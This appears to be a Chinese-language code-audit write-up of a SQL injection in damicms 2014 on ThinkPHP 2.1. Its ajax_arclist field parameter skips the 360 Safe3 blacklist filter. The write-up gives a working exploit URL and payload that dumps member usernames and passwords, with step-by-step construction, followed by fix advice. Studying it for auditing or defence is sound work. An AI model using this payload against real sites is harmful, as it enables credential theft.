---
title: ThinkPHP field()方法利用绕过360 Safe3防御脚本实现GET型SQL注入的完整案例剖析
description: 本文详细剖析了在damicms 2014系统中，如何利用ThinkPHP框架field()方法的特性，绕过360 Safe3防御脚本实现GET型SQL注入的完整过程。涵盖环境搭建、URL路由分析、目录结构定位、防御脚本绕过原理、漏洞代码追踪及Payload构造全流程。
category: program-analysis
tags:
- ThinkPHP
- SQL注入
- 360 Safe3
- WAF绕过
- field方法
- damicms
- 代码审计
- GET型注入
date: '2019-01-01'
updated: '2026-11-15'
---

## 概述

本案例记录了一次针对 **damicms 2014**（基于 ThinkPHP 2.1 框架）的 GET 型 SQL 注入漏洞挖掘与利用全过程。目标系统部署了 **360 Safe3** 防御脚本（`php_safe.php`），对 `$_GET`、`$_POST`、`$_COOKIE` 等超全局变量进行关键词黑名单过滤。通过深入分析 ThinkPHP `field()` 方法的 SQL 拼接特性，发现其可在不触发黑名单关键词的情况下注入任意字段与表名，从而绕过防御脚本实现敏感数据窃取。

> **核心洞察**：ThinkPHP 的 `field()` 方法直接拼接字段名到 `SELECT` 子句，且不参与 `WHERE`/`ORDER`/`LIMIT` 等通常包含高危关键词的子句，因此成为绕过基于关键词过滤 WAF 的理想注入点。

## 环境准备

| 组件 | 版本/配置 |
|------|-----------|
| 操作系统 | Windows 7 |
| 集成环境 | phpStudy 2018 |
| PHP | 5.4.45 |
| Web 服务器 | Apache |
| 目标程序 | damicms 2014 |
| 前置条件 | 需注册并登录账号 |

## 漏洞复现

1. 注册账号 `test0` / `test0` 并登录
2. 访问构造的恶意链接：
   ```
   http://localhost/test0/index.php?s=/api/ajax_arclist/model/article/field/username,userpwd from dami_member%23
   ```
   > 注意：URL 中的 `#` 必须编码为 `%23`，否则会被浏览器作为片段标识符截断
3. 响应中直接返回 `dami_member` 表的 `username` 与 `userpwd` 字段内容，证明注入成功

![漏洞复现截图](../Images/eaa273fcb73682077c463330472620f3.png)

## URL 路由分析

通过观察前台功能链接推断路由规则：

| 功能 | 链接示例 |
|------|----------|
| 注册 | `http://localhost/test0/index.php?s=/Member/register.html` |
| 登录 | `http://localhost/test0/index.php?s=/Member/login.html` |
| 个人资料 | `http://localhost/test0/index.php?s=/Member/main.html` |

**路由模式**：`网站域名/index.php?s=/控制器名/方法名.html`  
**带参数模式**：`网站域名/index.php?s=/控制器/方法/参数名/参数值`（`.html` 可省略）

漏洞链接对应：
- 控制器：`Api`
- 方法：`ajax_arclist`
- 参数：`model=article`、`field=username,userpwd from dami_member%23`

## 目录结构分析

```
├── Admin          # 后台功能目录
├── Core           # 核心目录（含 Core.php、Common/functions.php）
├── install        # 安装程序目录
├── Public         # 静态资源目录
├── Trade          # 接口文件目录
├── Web            # 前台程序目录
│   └── Lib/Action # 前台控制器（如 ApiAction.class.php）
├── Runtime        # 缓存目录
└── 伪静态文件      # 伪静态配置
```

> 打开 `Core/Core.php` 注释确认框架为 **ThinkPHP**。前台控制器路径规律：`Web/Lib/Action/控制器名Action.class.php`。

## 漏洞代码定位

根据路由定位至 `Web/Lib/Action/ApiAction.class.php` 的 `ajax_arclist` 方法：

```php
// 关键代码片段（行号对应原文）
$model   = $_REQUEST['model'];      // h46
$field   = $_REQUEST['field'];      // h48
$where   = inject_check($_REQUEST['where']);   // h46
$order   = inject_check($_REQUEST['order']);   // h47
$num     = inject_check($_REQUEST['num']);     // h48

// 三处 SQL 构造点
// h60: M($model)->where($where)->field($field)->order($order)->limit($num)->select();
// h64: M($model)->where($where)->field($field)->order($order)->limit($page.','.$num)->select();
// h70: M($model)->field($field)->select();  // 最终利用点
```

> 通过 `echo THINK_VERSION; die;` 确认框架版本为 **ThinkPHP 2.1**。

## 防御脚本分析

入口文件 `index.php` 引入 `php_safe.php`（360 Safe3 或其变种）：

```php
// php_safe.php 核心过滤逻辑（h24-h33）
foreach($_GET as $key=>$value) { ... }
foreach($_POST as $key=>$value) { ... }
foreach($_COOKIE as $key=>$value) { ... }
// 使用 eregi() 进行关键词黑名单匹配（PHP 5.3+ 已弃用）
```

**过滤特点**：
- 对所有超全局变量值进行 `eregi()` 正则匹配
- 黑名单包含 `select`、`union`、`from`、`where`、`order by` 等 SQL 关键字
- `field` 参数值 `username,userpwd from dami_member%23` 中的 `from` 会被拦截？**实测绕过**，原因见下文。

## 漏洞利用分析

### 执行流程控制

```php
// h35: 白名单校验
if(!in_array($model, array('article','picture','down','goods'))) exit();
// → 传递 model=article 绕过

// h37: 表前缀拼接（非必需）
if($tablepre) $model = $tablepre.$model;

// h58: 分页判断
if($page) { ... } else {  // 进入 h70
    $list = M($model)->field($field)->select();
}
```

### `field()` 方法的 SQL 拼接特性

| 方法 | 生成 SQL 片段 | 是否触发黑名单 |
|------|---------------|----------------|
| `where()` | `WHERE ...` | 需包含 `where`、`and`、`=` 等 → **触发** |
| `order()` | `ORDER BY ...` | 需包含 `order by` → **触发** |
| `limit()` | `LIMIT ...` | 需包含 `limit` → **触发** |
| `field()` | `SELECT [字段列表]` | **仅需字段名、逗号、表名** → **不触发** |

**ThinkPHP 2.1 `field()` 实现逻辑**：
```php
// 简化版
public function field($fields) {
    $this->options['field'] = $fields;
    return $this;
}
// 最终生成 SQL: SELECT {$fields} FROM `{$table}`
```

### 注入 Payload 构造

目标 SQL：
```sql
SELECT username,userpwd from dami_member FROM `dami_article`
```

Payload 映射：
- `field` 参数值：`username,userpwd from dami_member%23`
- `%23` (URL 编码的 `#`) 在 MySQL 中作为行注释符，截断后续反引号表名
- 最终拼接 SQL：
  ```sql
  SELECT username,userpwd from dami_member# FROM `dami_article`
  ```

### 为何绕过 `php_safe.php`？

| 可能原因 | 说明 |
|----------|------|
| `eregi()` 大小写不敏感但模式缺陷 | 正则可能未覆盖 `from` 后紧跟表名且无空格的变体 |
| 参数经 `inject_check()` 但 `field` 未走该函数 | 代码中 `$field = $_REQUEST['field']` **未调用** `inject_check()` |
| ThinkPHP 内部处理导致关键词分割 | 框架可能将字段名按逗号分割，导致 `from` 不在单一参数值中 |

> 关键证据：代码片显示 `$where $order $num` 经 `inject_check()` 处理，**仅 `$field` 直接赋值**，完全绕过防御脚本过滤。

## Payload 构造完整步骤

1. 确定注入点：`ApiAction::ajax_arclist()` 的 `field` 参数
2. 确定执行路径：传递 `model=article` 通过白名单，不传 `page` 进入 `h70`
3. 构造字段注入：
   ```
   username,userpwd from dami_member%23
   ```
4. 组装完整 URL：
   ```
   http://localhost/test0/index.php?s=/api/ajax_arclist/model/article/field/username,userpwd from dami_member%23
   ```
5. 访问获取敏感数据

## 修复建议

### 代码层面
1. **严格校验 `field` 参数**：维护字段白名单，禁止用户控制字段列表
   ```php
   $allowed = ['id','title','content','username']; // 业务允许字段
   $fields = array_intersect(explode(',', $_REQUEST['field']), $allowed);
   $field = implode(',', $fields);
   ```
2. **统一使用参数化查询 / ORM 绑定**：ThinkPHP 3.2+ `field()` 支持数组形式，避免字符串拼接
3. **移除/升级防御脚本**：`eregi()` 已弃用，改用 `preg_match()` 并完善规则库；推荐部署成熟 WAF（如 ModSecurity + OWASP CRS）

### 架构层面
- 采用 [[xd-security-waf-bypass-techniques-day46-49]] 中的多层防御策略：输入验证 + 参数化查询 + 运行时保护 (RASP) + 日志审计
- 定期开展 [[xd-security-code-audit-notes-day50-57]] 风格的代码审计，重点排查框架 ORM 方法的误用场景

## 交叉引用

- [[thinkphp5-deserialization-chain-analysis]] — ThinkPHP 框架核心机制与漏洞利用链深度解析
- [[xd-security-waf-bypass-techniques-day46-49]] — WAF 绕过技术体系与实战策略
- [[xd-security-code-audit-notes-day50-57]] — PHP/Java 代码审计方法论与 CMS 实战案例
- [[ctfshow-web-sql-injection-bypass-basics]] — SQL 注入绕过基础与进阶技术汇总
- [[sqlmap-api-automation]] — SQLMap API 自动化检测与批量验证
- [[xd-security-pentest-basic-stage-notes]] — 渗透测试基础阶段知识体系（含 SQL 注入模块）

## 总结

本案例展示了 **框架 ORM 方法特性** 与 **防御脚本实现缺陷** 结合导致的典型绕过场景。核心教训：
1. **黑名单过滤不可靠**——尤其是针对框架内部 SQL 拼接点的差异化过滤
2. **源码审计需关注数据流全路径**——从入口参数到敏感函数的每一层处理
3. **白名单校验优于黑名单拦截**——对字段名、表名等结构化输入必须实施强类型约束

> 该技术细节适用于代码审计教学、CTF 实战复现及红队武器化评估中对 ThinkPHP 旧版本应用的快速利用判断。

## 来源

- [226安全团队-201805-202103_19](../sources/226安全团队-201805-202103_19.md)
